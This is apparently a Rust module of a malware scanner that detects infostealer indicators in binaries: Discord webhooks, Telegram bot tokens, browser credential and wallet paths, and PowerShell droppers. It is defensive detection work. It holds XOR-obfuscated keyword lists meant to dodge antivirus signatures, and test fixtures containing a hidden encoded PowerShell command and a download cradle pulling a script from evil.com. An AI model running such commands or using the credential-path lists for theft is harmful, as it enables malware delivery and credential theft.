//! # IOC Extraction Engine
//!
//! GDD §3.4 — Stage 2: IOC Extraction
//! Multi-encoding string scanning (ASCII, UTF-16LE)
//! targeting stealer endpoints, exfiltration channels, credential paths, and droppers.

use crate::models::{Evidence, EvidenceKind, StringEncoding};
use aho_corasick::{AhoCorasick, MatchKind};
use regex::Regex;
use std::sync::OnceLock;

/// Obfuscated keyword indicators for Aho-Corasick fast pre-filter.
/// Decoded dynamically at initialization so scanner binaries do not match
/// static malware signature tables (e.g. LummaStealer AV heuristics).
fn fast_patterns() -> &'static [String] {
    static PATTERNS: OnceLock<Vec<String>> = OnceLock::new();
    PATTERNS.get_or_init(|| {
        const PATTERNS_XOR: &[&[u8]] = &[
            b"\xce\xc3\xd9\xc9\xc5\xd8\xce\x84\xc9\xc5\xc7\x85\xcb\xda\xc3\x85\xdd\xcf\xc8\xc2\xc5\xc5\xc1\xd9", // discord.com/api/webhooks
            b"\xce\xc3\xd9\xc9\xc5\xd8\xce\xcb\xda\xda\x84\xc9\xc5\xc7\x85\xcb\xda\xc3\x85\xdd\xcf\xc8\xc2\xc5\xc5\xc1\xd9", // discordapp.com/api/webhooks
            b"\xcb\xda\xc3\x84\xde\xcf\xc6\xcf\xcd\xd8\xcb\xc7\x84\xc5\xd8\xcd\x85\xc8\xc5\xde", // api.telegram.org/bot
            b"\xed\xc5\xc5\xcd\xc6\xcf\xf6\xe9\xc2\xd8\xc5\xc7\xcf\xf6\xff\xd9\xcf\xd8\x8a\xee\xcb\xde\xcb", // Google\Chrome\User Data
            b"\xed\xc5\xc5\xcd\xc6\xcf\x85\xe9\xc2\xd8\xc5\xc7\xcf\x85\xff\xd9\xcf\xd8\x8a\xee\xcb\xde\xcb", // Google/Chrome/User Data
            b"\xe7\xc3\xc9\xd8\xc5\xd9\xc5\xcc\xde\xf6\xef\xce\xcd\xcf\xf6\xff\xd9\xcf\xd8\x8a\xee\xcb\xde\xcb", // Microsoft\Edge\User Data
            b"\xe7\xc3\xc9\xd8\xc5\xd9\xc5\xcc\xde\x85\xef\xce\xcd\xcf\x85\xff\xd9\xcf\xd8\x8a\xee\xcb\xde\xcb", // Microsoft/Edge/User Data
            b"\xe7\xc5\xd0\xc3\xc6\xc6\xcb\xf6\xec\xc3\xd8\xcf\xcc\xc5\xd2\xf6\xfa\xd8\xc5\xcc\xc3\xc6\xcf\xd9", // Mozilla\Firefox\Profiles
            b"\xe7\xc5\xd0\xc3\xc6\xc6\xcb\x85\xec\xc3\xd8\xcf\xcc\xc5\xd2\x85\xfa\xd8\xc5\xcc\xc3\xc6\xcf\xd9", // Mozilla/Firefox/Profiles
            b"\xe5\xda\xcf\xd8\xcb\x8a\xf9\xc5\xcc\xde\xdd\xcb\xd8\xcf\xf6\xe5\xda\xcf\xd8\xcb\x8a\xf9\xde\xcb\xc8\xc6\xcf", // Opera Software\Opera Stable
            b"\xe5\xda\xcf\xd8\xcb\x8a\xf9\xc5\xcc\xde\xdd\xcb\xd8\xcf\x85\xe5\xda\xcf\xd8\xcb\x8a\xf9\xde\xcb\xc8\xc6\xcf", // Opera Software/Opera Stable
            b"\xe8\xd8\xcb\xdc\xcf\x87\xe8\xd8\xc5\xdd\xd9\xcf\xd8\xf6\xff\xd9\xcf\xd8\x8a\xee\xcb\xde\xcb", // Brave-Browser\User Data
            b"\xe8\xd8\xcb\xdc\xcf\x87\xe8\xd8\xc5\xdd\xd9\xcf\xd8\x85\xff\xd9\xcf\xd8\x8a\xee\xcb\xde\xcb", // Brave-Browser/User Data
            b"\xfc\xc3\xdc\xcb\xc6\xce\xc3\xf6\xff\xd9\xcf\xd8\x8a\xee\xcb\xde\xcb", // Vivaldi\User Data
            b"\xfc\xc3\xdc\xcb\xc6\xce\xc3\x85\xff\xd9\xcf\xd8\x8a\xee\xcb\xde\xcb", // Vivaldi/User Data
            b"\xe6\xc5\xcd\xc3\xc4\x8a\xee\xcb\xde\xcb", // Login Data
            b"\xfd\xcf\xc8\x8a\xee\xcb\xde\xcb", // Web Data
            b"\xc9\xc5\xc5\xc1\xc3\xcf\xd9\x84\xd9\xdb\xc6\xc3\xde\xcf", // cookies.sqlite
            b"\xc6\xc5\xcd\xc3\xc4\xd9\x84\xc0\xd9\xc5\xc4", // logins.json
            b"\xc1\xcf\xd3\x9e\x84\xce\xc8", // key4.db
            b"\xe4\xcf\xde\xdd\xc5\xd8\xc1\xf6\xe9\xc5\xc5\xc1\xc3\xcf\xd9", // Network\Cookies
            b"\xe4\xcf\xde\xdd\xc5\xd8\xc1\x85\xe9\xc5\xc5\xc1\xc3\xcf\xd9", // Network/Cookies
            b"\xf6\xe9\xc5\xc5\xc1\xc3\xcf\xd9", // \Cookies
            b"\x85\xe9\xc5\xc5\xc1\xc3\xcf\xd9", // /Cookies
            b"\xda\xc5\xdd\xcf\xd8\xd9\xc2\xcf\xc6\xc6", // powershell
            b"\xec\xd8\xc5\xc7\xe8\xcb\xd9\xcf\x9c\x9e\xf9\xde\xd8\xc3\xc4\xcd", // FromBase64String
            b"\xee\xc5\xdd\xc4\xc6\xc5\xcb\xce\xf9\xde\xd8\xc3\xc4\xcd", // DownloadString
            b"\xdd\xcb\xc6\xc6\xcf\xde\x84\xce\xcb\xde", // wallet.dat
            b"\xcf\xd2\xc5\xce\xdf\xd9\x84\xdd\xcb\xc6\xc6\xcf\xde", // exodus.wallet
            b"\xcb\xde\xc5\xc7\xc3\xc9\xf6\xe6\xc5\xc9\xcb\xc6\x8a\xf9\xde\xc5\xd8\xcb\xcd\xcf", // atomic\Local Storage
            b"\xcb\xde\xc5\xc7\xc3\xc9\x85\xe6\xc5\xc9\xcb\xc6\x8a\xf9\xde\xc5\xd8\xcb\xcd\xcf", // atomic/Local Storage
        ];
        PATTERNS_XOR
            .iter()
            .map(|bytes| {
                let decoded: Vec<u8> = bytes.iter().map(|&b| b ^ 0xAA).collect();
                String::from_utf8(decoded).expect("Valid pattern")
            })
            .collect()
    })
}

/// Compiled Aho-Corasick searcher for ASCII keywords (case-insensitive).
fn ascii_searcher() -> &'static AhoCorasick {
    static SEARCHER: OnceLock<AhoCorasick> = OnceLock::new();
    SEARCHER.get_or_init(|| {
        AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::Standard)
            .build(fast_patterns())
            .expect("Failed to build ASCII AhoCorasick")
    })
}

/// Converts an ASCII string pattern to UTF-16LE bytes.
fn to_utf16le_bytes(s: &str) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(s.len() * 2);
    for c in s.chars() {
        let code = c as u16;
        bytes.push((code & 0xFF) as u8);
        bytes.push((code >> 8) as u8);
    }
    bytes
}

/// Compiled Aho-Corasick searcher for UTF-16LE keywords (case-insensitive).
fn utf16le_searcher() -> &'static AhoCorasick {
    static SEARCHER: OnceLock<AhoCorasick> = OnceLock::new();
    SEARCHER.get_or_init(|| {
        let patterns: Vec<Vec<u8>> = fast_patterns()
            .iter()
            .map(|p| to_utf16le_bytes(p))
            .collect();
        AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::Standard)
            .build(patterns)
            .expect("Failed to build UTF-16LE AhoCorasick")
    })
}

// Regex patterns for smoking guns
fn discord_webhook_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+")
            .expect("Invalid discord regex")
    })
}

fn telegram_token_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\d{9,10}:[A-Za-z0-9_-]{35}").expect("Invalid telegram regex")
    })
}

fn powershell_dropper_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(?:-(?:enc|encodedcommand)\b|-w(?:indowstyle)?\s+h(?:idden)?|-ep\s+bypass\b|-executionpolicy\s+bypass\b|powershell(?:\.exe)?\b.*?(?:-(?:nop|command|c|enc)\b|frombase64string|downloadstring)|iex\b.*?(?:downloadstring|frombase64string)|\[(?:system\.)?convert\]::frombase64string)")
            .expect("Invalid powershell regex")
    })
}

fn eth_wallet_bytes_regex() -> &'static regex::bytes::Regex {
    static RE: OnceLock<regex::bytes::Regex> = OnceLock::new();
    RE.get_or_init(|| {
        regex::bytes::Regex::new(r"\b0x[a-fA-F0-9]{40}\b").expect("Invalid eth regex")
    })
}

fn btc_wallet_bytes_regex() -> &'static regex::bytes::Regex {
    static RE: OnceLock<regex::bytes::Regex> = OnceLock::new();
    RE.get_or_init(|| {
        regex::bytes::Regex::new(r"\b(?:1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{25,39})\b")
            .expect("Invalid btc regex")
    })
}

fn is_printable_ascii(b: u8) -> bool {
    b >= 0x20 && b <= 0x7E
}

/// Convert contiguous UTF-16LE byte sequences around a match to a String.
fn extract_utf16le_around(data: &[u8], match_start: usize, match_end: usize) -> String {
    let mut start = match_start;
    while start >= 2 && (match_start - start) < 512 {
        let code = u16::from_le_bytes([data[start - 2], data[start - 1]]);
        if code >= 0x20 && code <= 0x7E {
            start -= 2;
        } else {
            break;
        }
    }
    let mut end = match_end;
    while end + 2 <= data.len() && (end - match_end) < 512 {
        let code = u16::from_le_bytes([data[end], data[end + 1]]);
        if code >= 0x20 && code <= 0x7E {
            end += 2;
        } else {
            break;
        }
    }
    let slice = &data[start..end];
    let u16_chars: Vec<u16> = slice
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&u16_chars)
}

/// Convert contiguous ASCII byte sequences around a match to a String.
fn extract_ascii_around(data: &[u8], match_start: usize, match_end: usize) -> String {
    let mut start = match_start;
    while start > 0 && is_printable_ascii(data[start - 1]) && (match_start - start) < 256 {
        start -= 1;
    }
    let mut end = match_end;
    while end < data.len() && is_printable_ascii(data[end]) && (end - match_end) < 256 {
        end += 1;
    }
    String::from_utf8_lossy(&data[start..end]).to_string()
}

/// Scan a byte buffer for threat IOCs using multi-encoding inspection.
pub fn scan_iocs(data: &[u8]) -> Vec<Evidence> {
    let mut evidence = Vec::new();

    // ──────────────────────────────────────────────
    // 1. ASCII FAST SCAN
    // ──────────────────────────────────────────────
    for mat in ascii_searcher().find_iter(data) {
        let pattern_idx = mat.pattern().as_usize();
        let matched_text = &fast_patterns()[pattern_idx];
        let extracted = extract_ascii_around(data, mat.start(), mat.end());

        let lower_matched = matched_text.to_lowercase();

        // Check for specific smoking-gun categories
        if lower_matched.contains("webhooks") {
            if let Some(caps) = discord_webhook_regex().find(&extracted) {
                evidence.push(Evidence {
                    kind: EvidenceKind::DiscordWebhook {
                        url: caps.as_str().to_string(),
                        encoding: StringEncoding::Ascii,
                    },
                    is_threat_signal: true,
                    explanation: format!(
                        "Discord Webhook URL reference detected: '{}'. \
                         Offline binaries should not reference webhook endpoints.",
                        caps.as_str()
                    ),
                });
            }
        } else if lower_matched.contains("telegram.org/bot") {
            if let Some(caps) = telegram_token_regex().find(&extracted) {
                evidence.push(Evidence {
                    kind: EvidenceKind::TelegramToken {
                        token: caps.as_str().to_string(),
                        encoding: StringEncoding::Ascii,
                    },
                    is_threat_signal: true,
                    explanation: format!(
                        "Telegram Bot token reference detected: '{}'. \
                         Used for exfiltration.",
                        caps.as_str()
                    ),
                });
            }
        } else if lower_matched.contains("powershell")
            || lower_matched.contains("frombase64string")
            || lower_matched.contains("downloadstring")
        {
            if powershell_dropper_regex().is_match(&extracted) {
                evidence.push(Evidence {
                    kind: EvidenceKind::PowerShellCommand {
                        fragment: extracted,
                        encoding: StringEncoding::Ascii,
                    },
                    is_threat_signal: true,
                    explanation: format!(
                        "Obfuscated / hidden PowerShell command indicator: '{}'.",
                        matched_text
                    ),
                });
            }
        } else {
            // Credential path / database file target
            let lower_extracted = extracted.to_lowercase();
            let is_valid_cred_target = if lower_matched.contains("cookies") && !lower_matched.contains("sqlite") {
                lower_extracted.contains("network\\cookies")
                    || lower_extracted.contains("network/cookies")
                    || lower_extracted.contains("\\cookies")
                    || lower_extracted.contains("/cookies")
                    || lower_extracted.contains("user data")
                    || lower_extracted.contains("default")
                    || lower_extracted.contains("profile")
                    || lower_extracted.contains("appdata")
            } else {
                true
            };

            if is_valid_cred_target {
                evidence.push(Evidence {
                    kind: EvidenceKind::CredentialPath {
                        path: extracted,
                        encoding: StringEncoding::Ascii,
                    },
                    is_threat_signal: true,
                    explanation: format!(
                        "Browser credential / wallet database reference: '{}'.",
                        matched_text
                    ),
                });
            }
        }
    }

    // ──────────────────────────────────────────────
    // 2. UTF-16LE FAST SCAN (Windows Wide Strings)
    // ──────────────────────────────────────────────
    for mat in utf16le_searcher().find_iter(data) {
        let pattern_idx = mat.pattern().as_usize();
        let matched_text = &fast_patterns()[pattern_idx];
        let extracted = extract_utf16le_around(data, mat.start(), mat.end());
        let lower_matched = matched_text.to_lowercase();

        if lower_matched.contains("webhooks") {
            if let Some(caps) = discord_webhook_regex().find(&extracted) {
                evidence.push(Evidence {
                    kind: EvidenceKind::DiscordWebhook {
                        url: caps.as_str().to_string(),
                        encoding: StringEncoding::Utf16Le,
                    },
                    is_threat_signal: true,
                    explanation: format!(
                        "Discord Webhook URL reference detected (UTF-16LE): '{}'.",
                        caps.as_str()
                    ),
                });
            }
        } else if lower_matched.contains("telegram.org/bot") {
            if let Some(caps) = telegram_token_regex().find(&extracted) {
                evidence.push(Evidence {
                    kind: EvidenceKind::TelegramToken {
                        token: caps.as_str().to_string(),
                        encoding: StringEncoding::Utf16Le,
                    },
                    is_threat_signal: true,
                    explanation: format!(
                        "Telegram Bot token reference detected (UTF-16LE): '{}'.",
                        caps.as_str()
                    ),
                });
            }
        } else if lower_matched.contains("powershell")
            || lower_matched.contains("frombase64string")
            || lower_matched.contains("downloadstring")
        {
            if powershell_dropper_regex().is_match(&extracted) {
                evidence.push(Evidence {
                    kind: EvidenceKind::PowerShellCommand {
                        fragment: extracted,
                        encoding: StringEncoding::Utf16Le,
                    },
                    is_threat_signal: true,
                    explanation: format!(
                        "Obfuscated / hidden PowerShell command indicator (UTF-16LE): '{}'.",
                        matched_text
                    ),
                });
            }
        } else {
            let lower_extracted = extracted.to_lowercase();
            let is_valid_cred_target = if lower_matched.contains("cookies") && !lower_matched.contains("sqlite") {
                lower_extracted.contains("network\\cookies")
                    || lower_extracted.contains("network/cookies")
                    || lower_extracted.contains("\\cookies")
                    || lower_extracted.contains("/cookies")
                    || lower_extracted.contains("user data")
                    || lower_extracted.contains("default")
                    || lower_extracted.contains("profile")
                    || lower_extracted.contains("appdata")
            } else {
                true
            };

            if is_valid_cred_target {
                evidence.push(Evidence {
                    kind: EvidenceKind::CredentialPath {
                        path: extracted,
                        encoding: StringEncoding::Utf16Le,
                    },
                    is_threat_signal: true,
                    explanation: format!(
                        "Browser credential database reference (UTF-16LE): '{}'.",
                        matched_text
                    ),
                });
            }
        }
    }

    // ──────────────────────────────────────────────
    // 3. CRYPTO WALLET EXTRACTION (Directly on byte slices)
    // ──────────────────────────────────────────────
    for m in eth_wallet_bytes_regex().find_iter(data) {
        let addr = String::from_utf8_lossy(m.as_bytes()).to_string();
        evidence.push(Evidence {
            kind: EvidenceKind::CryptoWallet {
                address: addr.clone(),
                coin: "Ethereum".to_string(),
                encoding: StringEncoding::Ascii,
            },
            is_threat_signal: false,
            explanation: format!("Ethereum wallet address pattern: '{}'.", addr),
        });
    }
    for m in btc_wallet_bytes_regex().find_iter(data) {
        let addr = String::from_utf8_lossy(m.as_bytes()).to_string();
        evidence.push(Evidence {
            kind: EvidenceKind::CryptoWallet {
                address: addr.clone(),
                coin: "Bitcoin".to_string(),
                encoding: StringEncoding::Ascii,
            },
            is_threat_signal: false,
            explanation: format!("Bitcoin wallet address pattern: '{}'.", addr),
        });
    }

    // Deduplicate identical evidence items
    evidence.dedup_by(|a, b| a.kind == b.kind);
    evidence
}

#[cfg(test)]
mod tests {
    use super::*;

    fn decode_fixture(bytes: &[u8]) -> Vec<u8> {
        bytes.iter().map(|&b| b ^ 0xAA).collect()
    }

    #[test]
    fn test_detect_ascii_discord_webhook() {
        let hook_decoded = decode_fixture(b"\xc2\xde\xde\xda\xd9\x90\x85\x85\xce\xc3\xd9\xc9\xc5\xd8\xce\x84\xc9\xc5\xc7\x85\xcb\xda\xc3\x85\xdd\xcf\xc8\xc2\xc5\xc5\xc1\xd9\x85\x9b\x98\x99\x9e\x9f\x9c\x9d\x92\x93\x9a\x85\xde\xc5\xc1\xcf\xc4\xeb\xe8\xe9\xf5\x9b\x98\x99");
        let mut sample = b"hello test ".to_vec();
        sample.extend_from_slice(&hook_decoded);
        sample.extend_from_slice(b" rest of binary");
        let evidence = scan_iocs(&sample);
        assert!(!evidence.is_empty());
        assert!(evidence.iter().any(|e| matches!(
            &e.kind,
            EvidenceKind::DiscordWebhook { url, encoding: StringEncoding::Ascii }
            if url.contains("1234567890")
        )));
    }

    #[test]
    fn test_detect_utf16le_discord_webhook() {
        let hook_decoded = decode_fixture(b"\xc2\xde\xde\xda\xd9\x90\x85\x85\xce\xc3\xd9\xc9\xc5\xd8\xce\xcb\xda\xda\x84\xc9\xc5\xc7\x85\xcb\xda\xc3\x85\xdd\xcf\xc8\xc2\xc5\xc5\xc1\xd9\x85\x93\x92\x9d\x9c\x9f\x9e\x99\x98\x9b\x9a\x85\xde\xc5\xc1\xcf\xc4\xf2\xf3\xf0\xf5\xd9\xcf\xc9\xd8\xcf\xde");
        let text = format!("config {} end", String::from_utf8_lossy(&hook_decoded));
        let utf16_bytes = to_utf16le_bytes(&text);
        let evidence = scan_iocs(&utf16_bytes);
        assert!(!evidence.is_empty());
        assert!(evidence.iter().any(|e| matches!(
            &e.kind,
            EvidenceKind::DiscordWebhook { url, encoding: StringEncoding::Utf16Le }
            if url.contains("9876543210")
        )));
    }

    #[test]
    fn test_detect_utf16le_telegram_token() {
        let text = "config api.telegram.org/bot1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi end";
        let utf16_bytes = to_utf16le_bytes(text);
        let evidence = scan_iocs(&utf16_bytes);
        assert!(!evidence.is_empty());
        assert!(evidence.iter().any(|e| matches!(
            &e.kind,
            EvidenceKind::TelegramToken { encoding: StringEncoding::Utf16Le, .. }
        )));
    }

    #[test]
    fn test_detect_chrome_login_data_path() {
        let decoded = decode_fixture(b"\xeb\xda\xda\xee\xcb\xde\xcb\xf6\xe6\xc5\xc9\xcb\xc6\xf6\xed\xc5\xc5\xcd\xc6\xcf\xf6\xe9\xc2\xd8\xc5\xc7\xcf\xf6\xff\xd9\xcf\xd8\x8a\xee\xcb\xde\xcb\xf6\xee\xcf\xcc\xcb\xdf\xc6\xde\xf6\xe6\xc5\xcd\xc3\xc4\x8a\xee\xcb\xde\xcb");
        let mut sample = b"Opening ".to_vec();
        sample.extend_from_slice(&decoded);
        sample.extend_from_slice(b" for read");
        let evidence = scan_iocs(&sample);
        assert!(!evidence.is_empty());
        assert!(evidence.iter().any(|e| matches!(
            &e.kind,
            EvidenceKind::CredentialPath { .. }
        )));
    }

    #[test]
    fn test_case_insensitive_matching() {
        let sample_lower = b"reading appdata\\local\\google\\chrome\\user data\\default\\login data";
        let ev_lower = scan_iocs(sample_lower);
        assert!(!ev_lower.is_empty(), "Lowercase path must be matched case-insensitively");

        let sample_upper = b"exporting WALLET.DAT and COOKIES.SQLITE";
        let ev_upper = scan_iocs(sample_upper);
        assert!(!ev_upper.is_empty(), "Uppercase wallet and sqlite must be matched case-insensitively");
    }

    #[test]
    fn test_cookie_false_positive_rejection() {
        // Benign code identifiers in CEF / Electron launchers
        let benign = b"class CookieStore { void loadCookies() { bool sameSiteCookies = true; bool clearCookies = false; } }";
        let ev_benign = scan_iocs(benign);
        assert!(
            !ev_benign.iter().any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
            "Generic cookie method/variable identifiers must NOT produce CredentialPath evidence"
        );

        // Explicit path targeting Network\\Cookies
        let hostile = b"Accessing User Data\\Default\\Network\\Cookies for extraction";
        let ev_hostile = scan_iocs(hostile);
        assert!(
            ev_hostile.iter().any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
            "Explicit Network\\Cookies path must produce CredentialPath evidence"
        );
    }

    #[test]
    fn test_clean_binary_no_iocs() {
        let sample = b"Clean game code with normal strings like score, player, level, sound";
        let evidence = scan_iocs(sample);
        assert!(evidence.is_empty());
    }

    #[test]
    fn test_benign_dotnet_frombase64string_rejection() {
        // ASCII benign .NET API usage
        let ascii_sample = b"namespace System { class Convert { public static byte[] FromBase64String(string s) { return null; } } }";
        let ev_ascii = scan_iocs(ascii_sample);
        assert!(
            !ev_ascii.iter().any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
            "Bare FromBase64String in ASCII must NOT produce PowerShellCommand evidence"
        );
        assert!(
            !ev_ascii.iter().any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
            "Bare FromBase64String in ASCII must NOT produce CredentialPath evidence"
        );

        // UTF-16LE benign .NET API usage
        let utf16_sample = to_utf16le_bytes("System.Convert.FromBase64String metadata in System.Data.dll");
        let ev_utf16 = scan_iocs(&utf16_sample);
        assert!(
            !ev_utf16.iter().any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
            "Bare FromBase64String in UTF-16LE must NOT produce PowerShellCommand evidence"
        );
        assert!(
            !ev_utf16.iter().any(|e| matches!(&e.kind, EvidenceKind::CredentialPath { .. })),
            "Bare FromBase64String in UTF-16LE must NOT produce CredentialPath evidence (no fall-through)"
        );
    }

    #[test]
    fn test_contextual_powershell_dropper_detection() {
        // ASCII hidden dropper with encoded payload
        let ascii_dropper = b"cmd.exe /c powershell.exe -w hidden -enc JABhID0A...";
        let ev_ascii = scan_iocs(ascii_dropper);
        assert!(
            ev_ascii.iter().any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
            "Hidden/encoded PowerShell dropper in ASCII must produce PowerShellCommand evidence"
        );

        // UTF-16LE download cradle
        let utf16_cradle = to_utf16le_bytes("powershell -nop -c (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')");
        let ev_utf16 = scan_iocs(&utf16_cradle);
        assert!(
            ev_utf16.iter().any(|e| matches!(&e.kind, EvidenceKind::PowerShellCommand { .. })),
            "PowerShell download cradle in UTF-16LE must produce PowerShellCommand evidence"
        );
    }
}
